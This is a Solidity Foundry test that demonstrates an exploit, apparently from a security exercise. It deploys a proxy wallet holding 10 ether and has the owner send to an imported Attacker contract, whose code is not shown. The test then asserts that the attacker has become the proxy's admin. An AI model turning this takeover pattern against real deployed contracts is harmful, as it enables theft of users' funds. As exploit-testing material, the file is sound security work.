// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {Proxy} from "../src/Proxy.sol";
import {Attacker} from "../src/Attacker.sol";
import {Wallet3} from "../src/Wallet3.sol";

contract TestExploit is Test {
    Proxy proxy;
    Wallet3 implementation;
    Attacker attacker;
    address owner;
    address attackerAddr;

    function setUp() public {
        owner = makeAddr("owner");
        attackerAddr = makeAddr("attacker");

        vm.startPrank(owner);
        implementation = new Wallet3();
        proxy = new Proxy(address(implementation));
        Wallet3 proxyWallet = Wallet3(payable(address(proxy)));
        proxyWallet.initialize59ad(owner);
        vm.stopPrank();

        attacker = new Attacker(Wallet3(payable(address(proxy))));
        vm.deal(address(proxy), 10 ether);
    }

    function testAttack() public {
        console.log("old implementation", proxy.getImplementation1599d());
        console.log("old owner", proxy.getAdmin397fa());

        Wallet3 proxyWallet = Wallet3(payable(address(proxy)));
        attacker.setNewOwner(attackerAddr);

        vm.broadcast(owner);
        proxyWallet.send47de(address(attacker));
        console.log("new implementation", proxy.getImplementation1599d());
        console.log("new owner", proxy.getAdmin397fa());
        assert(attackerAddr == proxy.getAdmin397fa());
    }
}
